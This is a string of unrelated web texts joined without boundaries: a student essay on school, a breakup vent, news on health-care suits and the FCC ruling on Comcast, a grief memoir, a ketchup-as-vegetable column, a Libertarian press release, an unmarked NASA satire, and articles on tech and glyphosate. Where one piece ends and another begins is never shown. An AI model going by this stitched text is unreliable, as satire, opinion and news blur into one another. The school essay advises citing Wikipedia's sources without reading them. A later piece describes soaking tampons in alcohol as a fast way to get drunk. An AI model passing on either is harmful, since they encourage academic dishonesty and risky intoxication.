Thanks to the Internet , if we want to study something it's a matter of seconds before the relevant encyclopedia article is before us .
It makes doing research papers a heck of a lot easier , even if most teachers wo n't accept Wikipedia as a source ( Pro tip : teachers rarely check sources , so in a pinch , read the sources that are linked Wikipedia article and cite them instead ) .
And even if there are lots of bullying administrators , there are many good teachers , too .
Heaven bless the long - suffering school librarians : the library was the one place I enjoyed in school .
I could always find a good book to read there , and they even had manga .
My librarians were interested and helpful , and always wanted to chat about what you were currently reading .
The Library and a few good teachers are what kept me from dropping out .
It 's a shame that the football team got a bigger budget than the Library .
Petty acts of rebellion -- and innocent little covert activities -- kept our spirits up .
The school 's computer network may have been censored , but the sneakernet is alive and well .
Just like in times past , high school students do n't have much money to buy music , movies or games , but all are avidly traded at every American high school .
It used to be tapes ; now it 's thumbdrives and flash disks .
My friends and I once started an underground leaflet campaign that was a lot of fun .
I even read about a girl who ran a library of banned books out of her locker .
These trivial things are more important than they seembecause they make students feel like they have some measure of control over their lives .
Schools today are not training students to be good citizens : they are training students to be obedient .

I look at it as , " ladies if you are n't completely perfect in every single way , he 's going to cheat , and then it will be all your fault "
I 'm actually dealing with this issue right now .
I feel like we 're conditioned to constantly please men , never say or do anything that will upset them , but men ?
they get a free pass .
My ex boyfriend dumped me because I was pretty upset that he canceled on me for the ENTIRE weekend .
I understand he has no car , I 'm cool with that , neither do I , but truth of the matter is , out of the 72 hours in the weekend , if he really wanted to , he could have seen me for at least ten minutes .
One of us could have gotten on a bus to see the other , and if he had asked me to , I would have , but he made it very clear there was absolutely " no way " we could see each other at all .
So HE dumps ME because HE did n't want to make effort , and I got very upset about this ( also , I have bpd , and a history of giving giving giving in relationships but not getting in return . )
If it had been reversed , I could be dead tired , bleeding from all points , whatever , if I really wanted to see him , I would find a way , because I really dug this guy .
Granted , maybe I did get a little too upset , but he decided then and there , to end it , without giving me " another chance " which really should have been , " brush it off , get the fuck over it and continue with the relationship , maybe being mindful of my feelings for once .

Minnesota Attorney General Lori Swanson has rejected a request from Gov. Tim Pawlenty to sue over the new federal health care law .
Instead , Swanson said Monday she will file a friend - of - the - court brief supporting the federal government in a lawsuit filed by 13 state attorneys general .
The Democratic attorney general sent the Republican governor a letter saying a lawsuit is n't warranted because health care fits squarely within the federal government 's authority to regulate interstate commerce .
Pawlenty had asked Swanson to challenge whether a requirement that individuals buy health insurance is constitutional .
Swanson tells
Pawlenty he could file his own friend - of - the - court brief as governor to support the legal challenge .
In response to Swanson 's decision , the governor 's office issued a statement saying that Pawlenty will join other Republicans in fighting the law .
" Governor Pawlenty believes that the federal government is overreaching by subjecting citizens to a fine if they do not comply with a mandate to buy a good or service , " the statement said .
" Governor Pawlenty intends to participate in this litigation . "

Most beer bottles have some sort of date on them , but figuring out what they mean can be a bit confusing .
Some bottles have “ pull dates ” and some have “ born on dates . ”
What do each of these dates mean ?
Is n’t aged beer supposed to be good ?
Here ’s a closer look at the dates on your bottle , and how they can affect your beer .
The date you see on most beer bottles are not expiration dates but ‘ pull dates , ’ which are the dates retailers are instructed to pull beers off a shelf if they have n’t sold yet .
The beer inside has n’t expired , but it ’s not longer considered “ brewery fresh ” and most companies no longer want it to be sold .
Many brewers will buy these bottles back from a retailer a full retail price , so there is no reason to keeping old beer on the shelf .
“ Born on dates ” are the less common marking you ’ll find on some bottles indicating when the beer was bottled .
They were first introduced by Anheuser - Busch in the 1990 ’s as part of a marketing campaign , but in practice they also let the retailer know when beer should be taken off the shelf .
For many years A - B recommended a shelf life of 110 days , but a few years ago extended that to 180 days .
Of course this was n’t info readily available to the consumer , which can make born on dates a bit confusing as they ’re easy to mistake for pull dates .
While getting a beer as fresh as possible is great , aged beer can be pretty wonderful , so which beer should you pick up from the store ?
Well aging beer is unfortunately not as simple as letting a beer sit on a store shelf .
Beer only ages correctly under the proper conditions .
Usually this means a cool , dry place around 50 - 60 degrees Fahrenheit away from any direct light ; so basically the opposite of a store shelf .
Additionally , not all beer ages well .
Beers high in hops or low in alcohol ( under 6 % alcohol by volume ) typically are best consumed relatively fresh .
The long and short of it is that you should probably pay attention to dates on bottles , and try to pick up the freshest beer you can .
While there ’s a chance an old bottle of beer at the store will be just fine , that ’s a risk not worth taking .
Try to avoid any bottle at the store with dust on it , that way you can age it yourself properly if you want and ensure it will mature the right way .
Also generally speaking , unless otherwise noted , most dates on beers are pull dates , not born on dates .
Do you pay attention to the dates on beer bottles ?

According to a three - judge panel , " the Commission has failed to make that showing " and the FCC 's order against Comcast is tossed .
When the complaints against Comcast first surfaced , they noted that the company was violating the FCC's " Internet Policy Statement " drafted in 2005 .
That statement provided " four freedoms " to Internet users , including freedom from traffic discrimination apart from reasonable network management .
The FCC decided that Comcast 's actions had not been " reasonable network management , " but Comcast took to the agency to court , arguing that the FCC had no right to regulate its network management practices at all .
The Internet Policy Statement was not a rule ; instead , it was a set of guidelines , and even the statement admitted that the principles were n't legally enforceable .
To sanction Comcast , the FCC relied on its " ancillary " jurisdiction to implement the authority that Congress gave it — but was this kind of network management ruling really within the FCC 's remit ?
The court held that it was n't , that Congress had never given the agency the authority necessary to do this , and that the entire proceeding was illegitimate .
The FCC's " Order " against Comcast is therefore vacated ; Comcast wins .
The decision was n't a surprise ; during oral argument earlier this year , the judges pressed the FCC 's top lawyer repeatedly .
The Policy Statement was " aspirational , not operational , " they said ; the FCC had not identified a " specific statute " Comcast violated ; and the FCC " ca n't get an unbridled , roving commission to go about doing good . "
Comcast pledged some time ago to change the way it handled traffic management , and it has already transitioned to a protocol - agnostic approach to congestion .

Do you remember exactly what you were doing on this day , twelve years ago ?
I do .
You never know the days that will change you forever .
They start out like normal days , with normal things .
Breakfast and tying your shoes and buying groceries .
But by the end of a day , you ’re a completely different person .
Everything you did takes on an awful significance ; you think about the day before , and the day before that , and wonder if you ’d done one thing differently — not recommended a movie or picked up the phone instead of writing an email — the day might have had a different ending .
Everyone has those days .
They become the landmarks of our lives , forever burned into our hearts .
Twelve years ago , it was October 3 , 2004 .
I was 19 , a sophomore at the University of Dallas .
I lived in Catherine Hall with my friends .
It was the weekend before Charity Week at UD , one of most students ’ favorite times of year , a golden time on the cusp of midterms when everyone pulls together in silly stunts and festivities to raise funds for the junior class ’s chosen charities : hard work and hard play mingled together for a good cause .
My parents were in town for the weekend .
I ’d recently gotten out of a longish relationship , one that had me feeling trapped and miserable , and for the first time , I was free and single and really , truly happy .
My friends were all within shouting distance , I loved college , and I was going to spend the next semester in Rome .
I felt like things had finally fallen into place for me .
So when I dragged myself out of bed after going to bed at 2 or 3 — my friends and I had gone to a late - night showing of Ladder 49 , of all things — and I went to meet my parents for breakfast , life felt pretty perfect .
After my parents left , I did normal Sunday things : laundry , homework , a quick trip to Kroger , chatting with my brother on AIM .
I distinctly remember telling my brother I needed to get tea .
He told me to get green tea instead of black tea because it was better for me .
Those were the last words he ever said to me .
Oddly , I remember scattered things from later in the day more clearly .
I bought Stash Chai tea because my dad had just introduced me to chai from Starbucks and it was so delicious , I needed more .
I had an economics test the next day , but I did n’t study .
Instead , I went to my friend Alicia ’s room and we watched our favorite scenes from Return of the King .
At dinner , I ate a bowl of whipped cream on a dare .
I went back to my room , and I still did n’t study , which is , of all the quirky things I did that weekend , the most out of character for me .
I was lying on my bed , staring blankly at my notes , and I turned to my roommate and asked if she was going to Mass that night .
She said yes , and I packed up my notes and went with her .
Skipping study for church was n’t something I did , ever , and I still wonder why I did it .
After Mass , I tried to call my parents .
No one answered .
I left my brother a message on AIM , asking where everyone was .
Eventually , I gave up on studying and went to bed .
When the phone rang at about 4 a.m. , I knew something was wrong .
I answered .
My parents were at the dormitory door and needed me to let them in .
It had to be bad , for them to have driven three hours home and three hours back again .
My hands shook as I tied my new robe–purchased that weekend with my mom–over my pajamas .
I still have that damned robe , for some reason , even though I think of this night every time I wear it .
I ran through the halls and down the stairs to front door .
My parents were there , pale and red-eyed .
My dad told me there had been a car accident , and my brother had been killed .
He was 24 .
After that , the flashes of memory become more scattered and much more vivid .
My hand shaking as I tried to unlock the door and let us back into the dormitory .
Sobbing on a couch in the common room , asking if Brandon knew how much I loved him .
The RA poking her head out of a study room door , wide - eyed , asking if she could do anything to help .
The moment of renewed horror when I realized my brother had died while I was at church .
My roommate tucking my rosary into my backpack before I left .
The stuffed rabbit that went everywhere with me when I was a kid , waiting for me in my parents ’ car .
The message I ’d sent my brother on his computer screen , unread .
There are other memories I wo n’t tell you about — memories I wish I did n’t have , and I have no desire to share that pain .
We ’re all shaped by our own pain , and putting more of mine on you wo n’t help lessen the hurt .
I am not who I was .
I am not who I could have been .
I am me — but the other me , the me that could have been , died in a car accident on October 3 , 2004 with my older brother .
I do n’t have a nice resolution to this post .
I could say happy things about who I am now , how my brother would be proud of everything I ’ve done , that my family and friends saved me from my grief , over and over again .
That ’s all true .
But that ’s not the point .
The point is to say that those memories , awful and jagged as they are , are a part of me now .
Sharing them wo n’t make them go away .
And I know that everyone reading this probably has a day like this one .
I simply hope , for everyone who has an October 3 in their life , that someday you reach a day , a year , a lifetime , when you do n’t have to stroke those jagged edges with fretful , anxious thoughts .
I hope that someday you can look over them with the clarity that tells me now that there was nothing I could have done .
I hope someday the obsession that resurrects those painful days at the worst moments of your life gradually eases its hold on you .
I hope , above all , that you have someone who listens when you want to talk or distracts you when you do n’t want to think .
And if you need someone , I ’m here .
Dear Cecil :
The phrase " ketchup is a vegetable " is coming up a lot in discussions of President Reagan 's recent demise .
What 's the story behind that line ?
Who classifies ketchup , or any other food , as a vegetable , meat , legume , etc ?
Why do they feel a need to make these official classifications ?
Who in the Reagan administration actually made that decision ?
I 've also heard that the ketchup - as - vegetable thing was really Carter 's doing and that salsa was classified as a vegetable by Clinton .
When I search for the origin of the phrase , all I get are a bunch of political sites repeating it without explanation .
Russ , via e-mail
Cecil replies :
No wonder .
The story is so convoluted that it defied simple explanation at the time .
Even today , the episode can be plausibly presented ( depending on the political leanings of the presenter ) as either a simple bureaucratic screwup or an unsuccessful effort by the right to pursue its agenda at the expense of the nation ’s kids .
Ketchup and other food products are classified for different purposes by different agencies under a wide variety of federal programs .
The classification in this case was by the U.S. Department of Agriculture for its subsidized school lunch program .
Then as now , local school districts could receive reimbursement for each lunch served provided it met minimum standards .
In mid-1981 , only a few months after Reagan took office , Congress cut $ 1 billion from child - nutrition funding and gave the USDA 90 days — the blink of an eye , for the federal bureaucracy — to come up with new standards that would enable school districts to economize , in theory without compromising nutrition .
The USDA convened a panel of nutritionists and food service directors to ponder what to do .
One option on the table — no one later would admit to putting it there — was to “ accept catsup as a fruit / vegetable when used as an ingredient . ”
Some panel members seized on this as an opportunity to discuss whether to count ketchup even if used as a condiment .
From what I can tell , the motive was n’t so much penuriousness as trying to face facts about what kids would actually eat .
USDA standards at the time required that a reimbursable lunch consist of five items : meat , milk , bread , and two servings of fruit or vegetables .
Many kids refused to eat the veggies and the stuff wound up as “ plate waste . ”
Would - be realists on the panel reasoned that if they could count ketchup as a vegetable they could meet federal standards without having to throw away so many lima beans , thereby saving money while having no impact on the kids .
Looked at in a certain light , it made sense .
Ketchup was n’t the only newly permissible substitute : pickle relish and conceivably other condiments could also count as vegetables ( precise interpretation was left to state officials ) ; protein sources like tofu or cottage cheese could replace meat ; and corn chips , pretzels , and other snacks could replace bread .
Minimum portion sizes were also reduced , purportedly another effort to reduce waste .
Mid-level Reaganauts at the USDA saw all this as a matter of giving the states more latitude ; wiser heads might have realized that the rest of the world would see it as taking food away from children .
Unfortunately for Reagan , the 90 - day deadline allowed no time for higher review .
When the proposed new rules were released for comment in September 1981 , food activists went ballistic .
Democratic politicians staged photo ops where they feasted on skimpy - looking meals that conformed to the new standards .
The mortified administration withdrew the proposal and the USDA official in charge of the program was transferred , a move widely interpreted as a firing .
One person who did n’t come out of the mess with ketchup on his face was Jimmy Carter , who ’d had nothing to do with it .
So , a garden - variety goof , right ?
It looked worse than that , thanks to agriculture secretary John Block , an antiregulatory zealot who attempted to defend the new rules after the fact , claiming they ’d been misunderstood .
Nonsense ; they were just stupid .
All intentions aside , counting condiments as vegetables and reducing portion sizes were an invitation to abuse .
A few months later the USDA adopted for preschools and elementary schools a more sensible policy already used in high schools , called “ offer vs. serve ” — schools still had to offer the five meal components , but students could refuse any two .
In the 90s , the Clinton administration got little grief when it proposed counting salsa as a vegetable , as properly made salsa has more nutritional heft than sugar - laden ketchup .
A reprise of the ketchup fiasco loomed recently when a federal judge approved new USDA regs classifying batter - coated french fries as a fresh vegetable .
Another attempt by the GOP to feed junk food to the playground set ?
Actually , it had more to do with creditor priority during bankruptcy settlements , believe it or not — but please , do n’t ask me to explain more than one bit of bureaucratic arcana at a time .

For Immediate Release
WASHINGTON – Wes Benedict , Executive Director of the Libertarian Party , issued the following statement today :
“ Many Libertarians around America are planning to go to Tea Party rallies tomorrow .
I also expect lots of Republican activists and politicians to be there .
But frankly , I do n’t think those Republicans belong there .
The people participating in these rallies are saying ‘ There ’s too much government spending , ’ but Republicans , decade after decade , have supported massive increases in government spending .
During the George W. Bush administration , Republicans in Congress supported spending trillions of dollars on foreign wars , a massive Medicare expansion , and banker bailouts .
Republicans doubled the budget and doubled the federal debt .
Why ca n’t the Republican Party just admit that it loves big government ?
“ If I thought there would be many Democrats at these rallies , I ’d criticize them too .
However , I think it ’s safe to say that they ’ll be few and far between .
“ Many Libertarians are enthusiastic about the Tea Parties , but many are not .
Many Libertarians are concerned that participating causes us to get lumped in with conservatives and Republicans .
In our online poll at LP.org , 28 % so far say that ‘ The Tea Parties have become too Republican - flavored . ’
“ Libertarians are often frustrated when the press characterizes us as ‘ right - wing ’ or ‘ conservative . ’
Although we certainly support reducing government spending , which most conservatives also claim to support , we differ from right - wingers on many issues : for example , we oppose foreign interventionism , support immigrant - friendly policies , oppose overreaction to terrorism , and oppose the War on Drugs .
“ Libertarians are neither left - wing nor right - wing .
We ’re in a different place on the political map , as illustrated by the popular World ’s Smallest Political Quiz .
“ Some of the people in the tax day Tea Party crowds will be right - wingers , and some will be Libertarians .
For those Tea Partiers who support Libertarian principles of very limited government spending , government tolerance on social issues , and a non-interventionist foreign policy , the Libertarian Party is ready to welcome them with open arms . ”
For more information , or to arrange an interview , call LP Executive Director Wes Benedict at 202-333-0008 ext. 222 .
The LP is America ’s third - largest political party , founded in 1971 .
The Libertarian Party stands for free markets and civil liberties .

Editor ’s Note :
[ cross - posted from the Official Google Enterprise Blog Today 's guest author is A.J. Clark , President of Thermopylae Sciences and Technology , which helps developers build new applications with the Google Earth browser plug - in on Google Earth Enterprise through the iSpatial framework .
A.J. works on the visualization , analysis , and dissemination of disaster / post - conflict data with a focus on emerging technologies that support participatory , collaborative approaches to spatial content creation and infrastructure development .
In the aftermath of the Haiti earthquake , an urgent need for geospatial data sharing arose .
As aid organizations and governments rushed to help , the collection and sharing of large amounts of geographic information among many sources and users presented a daunting challenge .
In response , the United States Southern Command (
USSOUTHCOM
) made information and tools available through an
interactive mapping website
which they call a User Defined Operational Picture ( UDOP ) , built on the
Google Earth Enterprise
platform to make visualizing the map and overlaid data easy and clear .
Public sites are now available both for the
Haiti earthquake
and the
Chile earthquake
, where thousands of users can view , create , and edit spatial data ( please note that you will be prompted to download the Google Earth plugin to view this data through these links . )
The system was rapidly deployed using an enterprise geospatial framework called iSpatial , which provides an open platform for the integration of dynamic data and the development of interactive applications .
The data is displayed using the
Google Earth browser plug - in and API
, which enables the visualization of geographic data layers in the rich , 3D Google Earth environment , on any web page .
The breadth of data sources and content producers contributing to and making use of the UDOP reflected the global community supporting the relief effort .
The combination of participatory geospatial content , the collaborative nature of the UDOP and the ability to integrate mobile applications as direct content producers is available for ongoing relief efforts .
This is an evolving capability within SOUTHCOM as we break new ground in providing collaborative tools for humanitarian aid and disaster relief efforts .

This , people , is a big one .
Remember all the articles we had on Theora , H264 , and which codec is better suited for HTML5 video ?
Well , it seems that Google has officially decided to put some serious weight behind …
Theora .
What they ’re doing is a baby step , but one specific aspect of that baby step is very important :
Google is openly stating that Theora is free of patents .
Google has decided to puts its weight behind Theorarm , an Ogg Theora / Vorbis decoding library specifically optimised towards the ARM platform .
Google will fund Theorarm ’s development in what is clearly an effort by the search and web giant to take away people ’s fears about mobile devices not being able to handle Theora .
In the blog post announcing the financial support , Google sings praise for Theora .
“ The complexity of Theora is considerably less than that of many of its peers ; other codecs often require dedicated hardware in devices to help achieve performance targets , but with careful coding Theora can be made to run without this , ” Google writes .
After praising Theora ’s quality and compression levels , Google states in no uncertain terms that Theora is patent free .
“ The overwhelming feature that makes it stand out from its rivals is the fact it ’s free , ” the company writes , “ Really free .
Not just ‘ free to use in decoders ’ , or ‘ free to use if you agree to this complicated license agreement ’ , but really , honestly , genuinely , 100 % free .
The specification for the stream and encoder / decoder source is available for public download and can be freely used / modified by anyone .
Theora was designed and is maintained with the overriding goal of avoiding patents .
No other codec can come even close to claiming to be as patent or royalty free as Theora can , whilst still holding a candle to the alternatives . ”
This means that Google , a major company with a legal department the size of Texas , believes that Theora is not a patent threat .
I , personally , have long argued that Google ’s inclusion of Theora in Chrome meant the company believes Theora is not under threat , but this pretty much seals the deal : Google openly and officially stating what most of us already knew .
This means that Google has positioned itself directly against Apple .
Not only is Google trying to solve the problem of Theora on mobile devices , the company is also giving a major vote of confidence regarding the patent issue .
If Theorarm manages to deliver , H264 supporters ( like Apple ) will no longer be able to claim that mobile devices are n’t ready for Theora .
This is interesting .
With teenagers coming up with new ways of getting intoxicated , the battle against Teen Alcohol Abuse is starting to look like an uphill climb .
Teenage girls are now experimenting with a new way to become intoxicated by soaking tampons in alcohol .
It ’s believed that this method would allow them to absorb the alcohol faster than if they were to drink it and to avoid having the smell of alcohol on their breath .
As absurd as this story may seem , it became reality for Milagros Rios , a 35 - year - old waitress and single mother of two in New York City who walked into her bathroom about a year ago to find her 18 - year - old daughter Nicole laying down on the floor and sleeping with a battle of vodka and a box of tampons in her hand .
“ I did n’t want to ruin my minty breath , ” says Nicole sarcastically .
“ I was worried about getting home smelling like beer and mom flipping on me , but I wanted to get a booze , so I did it . ”
According to Nicole , she had learned this method of “ drunk tampons ” from a friend who says it ’s a very common method in Barranquilla , Colombia .
Oxford University scientific journals first reported this practice of alcohol consumption in the 1990s ; by 1999 , in the Oxford University Journal , the Medical Council on Alcoholism mentioned this method as “ one of the unusual routes of alcohol ingestion that have been reported . ”
Although some gynecologists doubt it has achieved the status of a trend–no hard research data exists to support the idea of one–many agree that it can be an efficient way to get drunk fast .
“ Yes , alcohol and other substances can be absorbed from the thin and vascular mucosa of vagina and rectum , ” said Dr. Sorosh Roshan , a Board Certified Obstetrician and Gynecologist who maintained a private practice for more than thirty years in Summit , New Jersey and who is currently President of the International Health Awareness Network .
“ It ’s also true that the effect is faster than drinking , because the substance immediately enters the circulation by fast absorption into the vascular mucosa , not through stomach and dilution with gastric fluids , ” Roshan added .
The use of tampons soaked in alcohol to become intoxicated has been an open practice for at least three years and it has been spreading quickly throughout Europe and the United States .
It has even been referenced in a popular American song released in 2003 called “ Band Camp ” by Georgia folk singer and song - writer Vic Chesnutt with the lyrics : “ Once you soaked a tampon in some serious vodka , wore it to school , second period science lab , you feel right off your stool . ”
Meanwhile , Nicole continues to struggle with alcohol and life in general .
“ I do n’t know if I got used to them , messed up myself down there , or if my dependency has grown so big that I feel no pain anymore , ” Nicole said .
“ It does make me feel disgusted with myself though , when I am sober . ”
Nicole ’s friend who introduced her to the method on the other hand , said people should n’t be so alarmed about it .
“ It does n’t really matter how it gets in , ” she said .
“ Alcohol in your system is alcohol in your system .
El fin justifica los medios , which means , the aim justifies the means . ”
HOUSTON —NASA administrator Michael Griffin announced during a press conference Tuesday that the space agency is launching an ambitious mission to make Houston 's Johnson Space Center wireless - Internet capable within one decade .
Frustrated Mission Control Center staff experience yet another dial - up disconnection while browsing the web Tuesday .

" We are entering a new era for NASA , " Griffin said during a slide show for reporters showing conceptual illustrations of a wireless modem that would be used in all of the agency 's offices and laboratories that use personal computers .
" We are not content to rest on our laurels .
It may seem like an impossible task , but if we commit all of our focus , technology , and resources , we can get Wi -Fi into NASA 's offices and research labs within our generation . "
Griffin was confident that NASA 's estimated $ 655 million plan to install a wireless broadband router by 2017 could reap huge benefits for the entire space agency .

" In a few short years , all NASA employees will be able to check their e-mail throughout the complex , even in the cafeteria , " Griffin said .
According to agency officials , accessing the Internet has been an ongoing struggle for NASA .
Still relying on a single dial - up modem , employees nevertheless continue to get disconnected from the Internet whenever the Johnson Space Center receives an incoming call or someone picks up the phone to dial out .
In 2005 , NASA attempted to upgrade from dial - up to DSL , but the program was aborted when engineers were unable to get the Ethernet hub to function .

While the building that houses the public affairs office can currently pick up a weak Wi -Fi signal from a Starbucks across the street , the Johnson Space Center as a whole is far from being the " giant Wi - Fi hotspot " Griffin envisions .
" If NASA is to fulfill its vision of a working environment of today , we will need to develop existing technologies to ensure Internet connectivity can be sustained without employees becoming entangled in cords , " Griffin said .

Commanders Scott Dreisen and Alan Wittmer explore a Houston - area Best Buy for possible signs of wireless routers in NASA 's heroic first steps into the Wi-Fi Age .
If federal funding is approved , NASA will begin its search for wireless capability by sending a series of robotic probes into the depths of the Johnson Space Center , exploring the surfaces of desks and tables to search for the most viable modem base .
Once the probes have photographed the area , the information they have gathered will be transmitted back to Houston 's Mission Control Center for analysis .

Griffin said that the agency has also recruited seven information technology specialists from some of the nation 's top white - collar regional workplaces .
The seven mission specialists in the newly dubbed " Internet Explorer " program are being rigorously trained to install the theoretical wireless devices in an Earth - gravity environment in which they could encounter potentially arduous conditions such as poor air ventilation and lifeless workscapes .
Since spring , NASA has also conducted some preliminary , small - scale reconnaissance missions to a Houston - area Best Buy , where crews conducted research and compared prices .
Scientists within the agency say early data from the trips is promising , showing a generous return policy and an extended warranty plan .
In addition , researchers have investigated the digital cable setup at veteran space shuttle astronaut Ken Bowersox 's house .

NASA has suffered from a public credibility crisis in recent years due to perceived incompetence , a failed mission to Mars , the damaged and dormant Hubble telescope , and its inability to procure a long enough USB cable to reach all the way over to engineer William Chen 's cubicle .
But NASA officials argue that a secure high - speed line could prevent disasters such as a 2005 incident in which an employee attempting to download the movie trailer for Cheaper by the Dozen 2 crashed the Mission Control Center mainframe computer for two weeks .
Griffin may have an uphill battle convincing Congress to fund the project .
As the NASA administrator himself admitted at the press conference , even if a workable wireless router is successfully purchased , engineers will need at least an additional two years to examine the owner 's manual before attempting to install the complicated equipment .

Once the wireless local area network is completed , Griffin said that NASA will embark on its next great project : constructing a laptop capable of taking advantage of Wi -Fi 's high - speed access by 2037 .
Those hooking up the latest MacBook Pros to an HDTV using an HDMI adapter can now do so a little more easily : Apple has updated its implementation of Mini DisplayPort to pass audio signals through to any device that supports them .
Until now , the miniDP port only transmitted video , even though the DisplayPort spec supports optional alternate signal channels such as audio or USB .
Apple confirmed to Ars that the just - updated MacBook Pros will pass both video and audio signals to an HDTV or receiver when using an miniDP to HDMI adapter .
Apple sells one such adapter from Griffin online , though alternative from suppliers such as Monoprice are also available .
Apple does n't have any plans at this time to make its own adapter , contrary to earlier speculation .
As for the current 24 " LED Cinema Display , it still relies on USB for audio signals even when paired with the new MacBook Pros .
Aside from the fact that this Cinema Display was designed before Apple updated its implementation of miniDP , the USB connection also takes care of the on - board iSight video as well as the built - in USB hub .
The change in the miniDP ports will make connecting a MacBook Pro to an HDTV a little easier .
We have no doubt that Mac mini owners in particular will look forward to the new miniDP ports being added to a future hardware update , as that machine practically begs to be put to use as an HTPC .
UPDATE : Our friends at Italian Mac blog setteB.IT pointed up to this recent Apple knowledge base article noting that some HDMI adapters wo n't work with the new MacBook Pros if they are n't compliant with the 1.1a version or later of the DisplayPort spec .
There are some adapters out there that are n't fully compatible , so be sure to check if you plan to buy one .
The unusual thing we noticed is that this warning also applies to owners of the most recent iMac revision .
Those machines must then also have Apple 's updated miniDP ports .
To our knowledge , this is the first evidence that the new MacBook Pros were n't the first to enable audio passthrough via miniDP .
What would happen if a USDA scientist discovered that one of the most commonly used pesticides on the planet with a reputation for having saved millions of tons of US soil from erosion was — rather than a soil savior — a soil killer ?
That , to quote a certain paranormal expert , would be bad .
And yet , it ’s true .
This news came to the fore thanks to a recently published must - read article from Reuters on how government regulators are “ dropping the ball ” on agricultural biotechnology .
It begins with the story of USDA scientist Dr. Robert Kremer .
Kremer has spent the last fifteen years looking at Monsanto ’s blockbuster broad - spectrum herbicide glyphosate ( aka RoundUp ) , the most commonly used pesticide in the world and the companion to Monsanto ’s possibly monopolistic RoundupReady lines of genetically engineered seeds .
While exact figures are a closely guarded secret thanks to the USDA ’s refusal to update its pesticide use database after 2007 , estimates suggest upwards of 200 million pounds of glyphosate were dumped on fields and farms in the US in 2008 alone .
That ’s almost double the amount used in 2005 .
Glyphosate has a reputation as the “ safest ” of all the agricultural herbicides and has become the primary means of weed control in industrial agriculture .
While being the best of an extremely nasty bunch may be the faintest of praise , the USDA relies on this perception , which has been fueled by industry and government research indicating that the chemical dissipates quickly and shows low toxicity ( as poisons go , that is ) to humans .
The claim of “ millions of tons of soil saved ” relates to the soil that would have otherwise been lost to erosion without glyphosate ’s central role in chemical no - till farming techniques .
Indeed , experts such as Dr. Michael Shannon , a program director at the USDA ’s Agricultural Research Service , as well as other USDA scientists , make this anti-erosion claim the core argument in favor of the widespread use of the chemical .
Even so , glyphosate has been under attack from several quarters of late .
Research indicates that , while glyphosate on its own may be relatively “ safe , ” it is actually quite toxic in combination with the other ( supposedly “ inert ” ) ingredients in commercial preparations of the herbicide , i.e. the stuff that farmers actually spray on their fields .
And of course , there is the frightening spread of superweeds that glyphosate can no longer kill .
It ’s to the point that thousands of acres in the South have been abandoned to resistant strains of giant pigweed .
Enter Dr. Kremer .
His work , published in the peer - reviewed Journal of European Agronomy , further tarnishes glyphosate ’s golden status .
He has found that glyphosate ’s side - effects in the ground are far more severe than previously thought .
As he described it to me , the use of glyphosate causes :
damage to beneficial microbes in the soil increasing the likelihood of infection of a crop by soil pathogens
interference with nutrient uptake by the plant
reduced efficiency of symbiotic nitrogen fixation
overall lower - than - expected plant productivity
Dr. Kremer has even helpfully provided a set of recommendations for farmers who use glyphosate or who plant Monsanto ’s RoundUpReady seeds .
According to Dr. Kremer , the worst of the problems can be avoided if 1 ) farmers only plant RoundupReady crops every other year in the same field , 2 ) come up with alternate crop residue management techniques and 3 ) plant cover crops “ to revitalize soil biological and ecological processes as well as improve other aspects of soil quality . ”
A USDA scientist would n’t recommend measures like this if he were n’t convinced his results merited it .
From the Reuters article :
“ This could be something quite big .
We might be setting up a huge problem , ” said Kremer , who expressed alarm that regulators were not paying enough attention to the potential risks from biotechnology on the farm , including his own research … ” Science is not being considered in policy setting and deregulation , ” said Kremer .
“ This research is important .
We need to be vigilant . ”
Meanwhile , the response from the USDA to Dr. Kremer ’s work has been , shall we say , subdued .
Dr. Shannon of the USDA / ARS admitted that Dr. Kremer ’s results are valid , but said that the danger they represent pales in comparison to the superweed threat .
In fact , Shannon specifically likened Dr. Kremer ’s new findings to unfortunate but unavoidable side - effects like any drug might have .
Making matters worse , and much to Dr. Kremer ’s chagrin , the ARS refused to publicize his work on glyphosate .
While ARS spokesperson Sandy Miller Hays admitted that an announcement about his findings was written , she claimed it was withheld due to the quality of the writing .
In other words , the ARS killed the story because they could n’t bother to do some light editing .
Nor was the USDA ’s National Institute of Food and Agriculture ( NIFA ) very interested in Kremer ’s findings .
Run by Roger Beachy , a man with long - time links to the ag - biotech industry and an openly hostile attitude toward organic farming , NIFA is the bureaucratic nook within USDA responsible for informing farmers of new research .
When I asked if NIFA had a position on Dr. Kremer ’s work or if his guidance was being used by USDA extension agents , a NIFA spokesperson replied via email that :
[ T ]he advice and counsel provided by extension agents in the field is not “ approved ” or “ sanctioned ” by NIFA ; typically , these materials are developed through state and county extension offices , which receive some NIFA funding ( how much varies from state to state ) but are not managed by NIFA NIFA does not take positions on research papers , and has not produced any guidance about Dr. Kremer ’s work .
In short , nothing to see here .
Move along !
This most chilling comment of all , however , was provided by Miller Hays who observed that a European journal was the ideal place for this work because Europeans are “ passionately interested in … the soil and pesticide use and that sort of thing . ”
As opposed to we Americans , who do n’t care about the soil and pesticide use and that sort of thing ?
Following this particular USDA trail has reminded me of the age - old question , if a tree falls in a forest and people are standing around staring at it with their hands over their ears screaming “ I ’m not listening ! ! ” at the top of their lungs , does it make a sound ?
What I find most concerning about this episode is the willful inability of most divisions at USDA to conceive of agriculture without pesticides in general and glyphosate in particular .
Not that companies are n’t planning for a post - glyphosate world .
A recent article in the Western Farm Press painted a bleak future wherein farmers overcome the failures of individual pesticides ( failures caused by USDA and industry - encouraged overuse , by the way ) by planting genetically modified seeds that provide resistance to five or even six different pesticides at once .
The “ simplicity ” of Monsanto ’s GMO system of RoundupReady seeds plus glyphosate will be replaced by a dizzying and insanely toxic cocktail of pesticide treatments and hugely expensive seeds .
Leaving aside cost , farmers will barely be able to manage the mixing and maintenance of their equipment in this scenario .
There are alternatives .
I only wish that the USDA technical divisions would start taking the work of researchers like Dr. Kremer ( not to mention sustainable ag advocate Deputy Secretary of Agriculture Kathleen Merrigan ) more seriously .
Instead , they insist that farmers stay on the ever - accelerating and increasingly damaging chemical treadmill .
One of the most remarkable things about working in China is how much skill the workers have out there .
I think the video below speaks for itself .
[ Youtube link for those who cannot view embedded SWF . ]
This guy works at the factories that sew the chumby bags .
Apparently , he ’s not their fastest employee .
They have one who is about twice as fast , and he has been with the company for about seven years .
I went to his workstation , but when I got there he was already gone to lunch because he had finished everything .
And I mean , there were two enormous bins of finished cosmetics cases next to his workstation .
I think it ’s also interesting to notice that the guy in the video above is listening to his iPod while he sews .
Another thing that ’s pretty amazing is how rubberized tags are made in China .
These are the tags you see all over clothes–chances are you are wearing a piece of clothing or you carry around a bag with a tag like this .
I always thought that the tags were pressed by a machine .
I was wrong .
